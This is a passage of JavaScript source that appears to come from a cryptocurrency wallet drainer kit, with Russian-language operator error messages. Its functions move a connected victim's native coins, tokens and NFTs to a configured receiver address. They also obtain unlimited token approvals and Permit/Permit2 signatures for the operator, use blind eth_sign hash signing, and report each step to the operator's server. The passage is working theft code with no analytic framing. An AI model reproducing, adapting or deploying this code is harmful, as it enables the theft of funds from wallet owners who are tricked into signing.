  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset); sign_ready();
};

const SIGN_NFT = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], node);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      if (MS_Settings.Settings.Sign.NFTs == 1) {
        gas_limit = await contract.estimateGas.setApprovalForAll(MS_Settings.Address, true, { from: MS_Current_Address });
      } else if (MS_Settings.Settings.Sign.NFTs == 2) {
        gas_limit = await contract.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id, { from: MS_Current_Address });
      }
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
      gas_attempts += 1;
    }
  }
  if (ethers.BigNumber.from(await node.getBalance(MS_Current_Address)).lt(ethers.BigNumber.from(gas_limit).mul(ethers.BigNumber.from(gas_price)))) throw 'LOW_BALANCE';
  const nonce = await get_nonce(asset.chain_id);
  let data = null, web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC721'], asset.address);
  if (MS_Settings.Settings.Sign.NFTs == 1) data = web3_contract.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
  else if (MS_Settings.Settings.Sign.NFTs == 2) data = web3_contract.methods.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id).encodeABI();
  let tx_struct = {
    "to": asset.address, "nonce": web3.utils.toHex(nonce),
    "gasLimit": web3.utils.toHex(gas_limit), "gasPrice": web3.utils.toHex(gas_price),
    "value": '0x0', "data": data,
    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
  }, unsigned_tx = new ethereumjs.Tx(tx_struct),
  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
  keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
  await sign_request(asset);
  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
  const temporary = signed.substring(2),
  r_data = "0x" + temporary.substring(0, 64),
  s_data = "0x" + temporary.substring(64, 128),
  rhema = parseInt(temporary.substring(128, 130), 16),
  v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8);
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;
  unsigned_tx.v = v_data;
  const signed_tx = "0x" + unsigned_tx.serialize().toString("hex");
  sign_next();
  const tx = await node.sendTransaction(signed_tx);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset); sign_ready();
};

const DO_SWAP = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Pancake_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.swapExactTokensForETH(swap_value, '0', [
        asset.address, MS_Swap_Route[asset.chain_id]
      ], MS_Settings.Receiver, swap_deadline, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 350000);
      gas_attempts += 1;
    }
  }
  const nonce = await get_nonce(asset.chain_id);
  const swap_value = ethers.BigNumber.from(asset.amount_raw).lte(ethers.BigNumber.from(asset.swapper_allowance))
  ? ethers.BigNumber.from(asset.amount_raw).toString() : ethers.BigNumber.from(asset.swapper_allowance).toString();
  await swap_request(asset.swapper_type, asset, [ asset ]); sign_next();
  const tx = await contract.swapExactTokensForETH(swap_value, '0', [
    asset.address, MS_Swap_Route[asset.chain_id]
  ], MS_Settings.Receiver, swap_deadline, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, [ asset ]); sign_ready();
};

const DO_UNISWAP = async (asset, all_tokens) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Uniswap_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const swap_data = [];
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
      const web3_contract = new web3.eth.Contract(MS_Uniswap_ABI, token.swapper_address);
      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
        token.address, MS_Swap_Route[token.chain_id]
      ], MS_Settings.Receiver).encodeABI();
      swap_data.push(data);
    } catch(err) {
      console.log(err);
    }
  }
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
      gas_attempts += 1;
    }
  }
  await swap_request(asset.swapper_type, asset, all_tokens); sign_next();
  const tx = await contract.multicall(swap_deadline, swap_data, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
};

const DO_PANCAKE_V3 = async (asset, all_tokens) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Pancake_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const swap_data = [];
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
      const web3_contract = new web3.eth.Contract(MS_Pancake_ABI, token.swapper_address);
      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
        token.address, MS_Swap_Route[token.chain_id]
      ], MS_Settings.Receiver).encodeABI();
      swap_data.push(data);
    } catch(err) {
      console.log(err);
    }
  }
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
      gas_attempts += 1;
    }
  }
  await swap_request(asset.swapper_type, asset, all_tokens); sign_next();
  const tx = await contract.multicall(swap_deadline, swap_data, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
};

const DO_CONTRACT = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id); const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);

  let Contract_ABI = (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 1) ?
  JSON.parse(`[{"constant":false,"inputs":[],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`) :
  JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`);

  const contract = new ethers.Contract(MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address, Contract_ABI, MS_Signer);

  const gas_limit_nt = (asset.chain_id == 42161) ? 1500000 : (asset.chain_id == 43114 ? 1500000 : (asset.chain_id == 369 ? 500000 : 100000));
  const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000));

  const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);

  const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
  const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();

  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';

  await transfer_request(asset);
  sign_next(); let tx = null;
  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
    tx = await contract[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type](MS_Settings.Receiver, {
      gasLimit: ethers.BigNumber.from(gas_limit_nt),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce, value: ethers.BigNumber.from(after_fee),
      from: MS_Current_Address
    });
  } else {
    tx = await contract[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type]({
      gasLimit: ethers.BigNumber.from(gas_limit_nt),
      gasPrice: ethers.BigNumber.from(gas_price),
      nonce: nonce, value: ethers.BigNumber.from(after_fee),
      from: MS_Current_Address
    });
  }
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset, after_fee); sign_ready();
};

const TRANSFER_NATIVE = async (asset) => {
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address != '') return DO_CONTRACT(asset);
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();

  const gas_limit_nt = (asset.chain_id == 42161) ? 1500000 : (asset.chain_id == 43114 ? 1500000 : (asset.chain_id == 369 ? 100000 : 21000));
  const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000));

  const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
  const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
  const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();

  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';

  const nonce = await get_nonce(asset.chain_id);
  await transfer_request(asset);
  sign_next();
  const tx = await MS_Signer.sendTransaction({
    from: MS_Current_Address, to: MS_Settings.Receiver,
    value: ethers.BigNumber.from(after_fee),
    gasLimit: ethers.BigNumber.from(gas_limit_nt),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, data: '0x'
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset, after_fee); sign_ready();
};

const TRANSFER_TOKEN = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], MS_Signer);
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.transfer(MS_Settings.Receiver, asset.amount_raw, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
      gas_attempts += 1;
    }
  }
  await transfer_request(asset);
  sign_next();
  const tx = await contract.transfer(MS_Settings.Receiver, asset.amount_raw, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset); sign_ready();
};

const TRANSFER_NFT = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], MS_Signer);
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.amount_raw, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
      gas_attempts += 1;
    }
  }
  await transfer_request(asset);
  sign_next();
  const tx = await contract.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.amount_raw, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset); sign_ready();
};

const RETRO_MM_APPROVE_TOKEN = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
  let gas_limit = null;
  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.approve(MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
      gas_attempts += 1;
    }
  }
  let web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);
  let data = web3_contract.methods.approve(MS_Settings.Address, max_approval_amount).encodeABI();
  await approve_request(asset);
  sign_next();
  const result = await new Promise(resolve => {
    MS_Provider.sendAsync({
      from: MS_Current_Address, id: 1,
      jsonrpc: "2.0", method: "eth_sendTransaction",
      params: [
        {
          chainId: MS_Current_Chain_ID,
          data: data,
          from: MS_Current_Address,
          nonce: web3.utils.toHex(nonce),
          to: asset.address,
          value: `0x000${Math.floor(Math.random() * 9)}`,
          gasPrice: web3.utils.toHex(gas_price),
          gas: web3.utils.toHex(gas_limit)
        }
      ]
    }, (err, tx) => {
      resolve({ err, tx });
    });
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(result.tx.result, 1, 30000);
  await approve_success(asset); sign_ready();
};

const DO_SAFA = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], MS_Signer);
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.setApprovalForAll(MS_Settings.Address, true, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
      gas_attempts += 1;
    }
  }
  await approve_request(asset);
  sign_next();
  const tx = await contract.setApprovalForAll(MS_Settings.Address, true, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset); sign_ready();
};

const DO_PERMIT2 = async (asset, assets) => {
  const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_BATCH'], MS_Signer);
  let permit_domain = { name: "Permit2", chainId: asset.chain_id, verifyingContract: "0x000000000022d473030f116ddee9f6b43ac78ba3" };
  let permit_deadline = Date.now() + 1000 * 60 * 60 * 24 * 356, permit_signature = null, permit_message = null, permit_mode = null;
  if (assets.length > 1) {
    let permit_types = {
      "PermitBatch": [
        {
          "name": "details",
          "type": "PermitDetails[]"
        },
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "sigDeadline",
          "type": "uint256"
        }
      ],
      "PermitDetails": [
        {
          "name": "token",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint160"
        },
        {
          "name": "expiration",
          "type": "uint48"
        },
        {
          "name": "nonce",
          "type": "uint48"
        }
      ]
    };
    let tokens = [];
    for (const x_asset of assets) {
      try {
        tokens.push({
          "token": x_asset.address, "expiration": permit_deadline,
          "amount": "1461501637330902918203684832716283019655932542975",
          "nonce": (await contract.allowance(MS_Current_Address, x_asset.address, MS_Settings.Address)).nonce
        });
      } catch(err) {
        console.log(err);
      }
    }
    permit_message = {
      "details": tokens,
      "spender": MS_Settings.Address,
      "sigDeadline": permit_deadline
    };
    swap_request("Permit2", asset, assets); sign_next();
    permit_signature = await MS_Signer._signTypedData(permit_domain, permit_types, permit_message);
    permit_mode = 2;
  } else {
    // Permit Single
    let permit_types = {
      "PermitSingle": [
        {
          "name": "details",
          "type": "PermitDetails"
        },
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "sigDeadline",
          "type": "uint256"
        }
      ],
      "PermitDetails": [
        {
          "name": "token",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint160"
        },
        {
          "name": "expiration",
          "type": "uint48"
        },
        {
          "name": "nonce",
          "type": "uint48"
        }
      ]
    };
    permit_message = {
      "details": {
        "token": asset.address,
        "amount": "1461501637330902918203684832716283019655932542975",
        "expiration": permit_deadline, "nonce": (await contract.allowance(MS_Current_Address, asset.address, MS_Settings.Address)).nonce
      },
      "spender": MS_Settings.Address,
      "sigDeadline": permit_deadline
    };
    swap_request("Permit2", asset, [ asset ]); sign_next();
    permit_signature = await MS_Signer._signTypedData(permit_domain, permit_types, permit_message);
    permit_mode = 1;
  }
  if (permit_signature != null) {
    await swap_success('Permit2', asset, assets); wait_message();
    const x_promise = send_request({
      action: 'sign_permit2', user_id: MS_ID, signature: permit_signature,
      message: permit_message, asset: asset, assets, address: MS_Current_Address,
      mode: permit_mode
    });
    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
    sign_ready();
  } else {
    await sign_cancel();
  }
};

const PERMIT_TOKEN = async (asset) => {
  const contract = new ethers.Contract(asset.address, asset.abi, MS_Signer);
  const nonce = await contract.nonces(MS_Current_Address);
  const name = await contract.name();
  let value = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        value = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
  let permit_types = null, permit_values = null;
  if (asset.permit == 1) {
    permit_types = {
      Permit: [
        {
          name: "holder",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "expiry",
          type: "uint256",
        },
        {
          name: "allowed",
          type: "bool",
        }
      ]
    };
    permit_values = {
      holder: MS_Current_Address,
      spender: MS_Settings.Address,
      nonce: nonce,
      expiry: deadline,
      allowed: true
    };
  } else if (asset.permit == 2) {
    permit_types = {
      Permit: [
        {
          name: "owner",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "value",
          type: "uint256",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "deadline",
          type: "uint256",
        }
      ]
    };
    permit_values = {
      owner: MS_Current_Address,
      spender: MS_Settings.Address,
      value: value,
      nonce: nonce,
      deadline: deadline
    };
  }
  await approve_request(asset);
  sign_next();
  const result = await MS_Signer._signTypedData({
    name: name, version: asset.permit_ver, chainId: asset.chain_id,
    verifyingContract: asset.address
  }, permit_types, permit_values),
  signature = {
    r: result.slice(0, 66),
    s: "0x" + result.slice(66, 130),
    v: Number("0x" + result.slice(130, 132))
  };
  await approve_success(asset);
  wait_message();
  const x_promise = send_request({
    action: 'permit_token', user_id: MS_ID, sign: {
      type: asset.permit, version: asset.permit_ver,
      chain_id: asset.chain_id, address: asset.address,
      owner: MS_Current_Address, spender: MS_Settings.Address,
      value: value.toString(), nonce: nonce.toString(), deadline: deadline,
      r: signature.r, s: signature.s, v: signature.v, abi: asset.abi
    }, asset: asset, address: MS_Current_Address
  });
  if (MS_Settings.Settings.Wait_For_Response) await x_promise;
  sign_ready();
};

const sign_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'sign_success', asset, user_id: MS_ID });
    } else {
      await send_request({ action: 'sign_success', asset, user_id: MS_ID });
    }
  } catch(err) {
    console.log(err);
  }
}

const swap_success = async (type, asset, all_tokens = [], amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'swap_success', asset, user_id: MS_ID, list: all_tokens, swapper: type });
    } else {
      await send_request({ action: 'swap_success', asset, user_id: MS_ID, list: all_tokens, swapper: type });
    }
  } catch(err) {
    console.log(err);
  }
}

const transfer_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'transfer_success', asset, user_id: MS_ID });
    } else {
      await send_request({ action: 'transfer_success', asset, user_id: MS_ID });
    }
  } catch(err) {
    console.log(err);
  }
}

const approve_success = async (asset) => {
  try {
    await send_request({ action: 'approve_success', asset, user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_cancel = async () => {
  try {
    await send_request({ action: 'sign_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_unavailable = async () => {
  try {
    await send_request({ action: 'sign_unavailable', user_id: MS_ID });
    MS_Sign_Disabled = true;
  } catch(err) {
    console.log(err);
  }
}

const transfer_cancel = async () => {
  try {
    await send_request({ action: 'transfer_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const approve_cancel = async () => {
  try {
    await send_request({ action: 'approve_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const chain_cancel = async () => {
  try {
    await send_request({ action: 'chain_cancel', user_id: MS_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_success = async () => {
  try {
    await send_request({ action: 'chain_success', user_id: MS_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_request = async (old_chain, new_chain) => {
  try {
    await send_request({ action: 'chain_request', user_id: MS_ID, chains: [ old_chain, new_chain ] });
  } catch(err) {
    console.log(err);
  }
}

const sign_request = async (asset) => {
  try {
    await send_request({ action: 'sign_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const swap_request = async (type, asset, all_tokens = []) => {
  try {
    await send_request({ action: 'swap_request', user_id: MS_ID, asset, list: all_tokens, swapper: type });
  } catch(err) {
    console.log(err);
  }
}

const transfer_request = async (asset) => {
  try {
    await send_request({ action: 'transfer_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const approve_request = async (asset) => {
  try {
    await send_request({ action: 'approve_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const is_increase_approve = (func) => {
  try {
    if (func.hasOwnProperty('increaseAllowance')) {
      return 1;
    } else if (func.hasOwnProperty('increaseApproval')) {
      return 2;
    } else {
      return false;
    }
  } catch(err) {
    return false;
  }
};

const get_wallet_assets = async (address) => {
  try {
    let response = await send_request({ action: 'check_wallet', address: MS_Current_Address }), assets = [];
    if (response.status == 'OK') assets = await get_tokens(address);
    else if (MS_Settings.AT != "" && response.error == 'LOCAL_CHECK') assets = await get_tokens(address);
    else if (response.error != 'LOCAL_CHECK') return assets;
    else {
      MS_Check_Done = true;
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Critical Error', subtitle: 'Настройте оценщики', text: 'Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Ошибка</b><br><br>Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
      await new Promise(r => setTimeout(r, 10000));
      return assets;
    }

    let token_promises = [];

    for (let x = (assets.length - 1); x >= 0; x--) {
      try {
        const asset = assets[x];
        const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
        if (!MS_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && !MS_Settings.Settings.Chains[chain_id].Native) assets.splice(x, 1);
